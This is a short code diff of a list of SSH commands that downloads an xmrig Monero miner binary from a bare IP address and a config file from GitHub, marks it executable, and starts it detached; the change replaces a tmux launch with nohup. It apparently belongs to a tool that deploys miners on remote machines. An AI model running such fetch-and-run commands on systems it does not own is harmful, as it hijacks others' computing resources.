@@ -25,7 +25,7 @@ sshcmd = [
     "wget http://158.69.130.165/xmrig/build/xmrig", # Downloads xmrig
     "wget https://raw.githubusercontent.com/junaidd007/Monero/main/config.json", #downloads the config file
     "chmod +x ./xmrig"
-    "tmux new-session -d -s 'xmrig' ./xmrig"
+    "nohup ./xmrig"
         
 ]
 
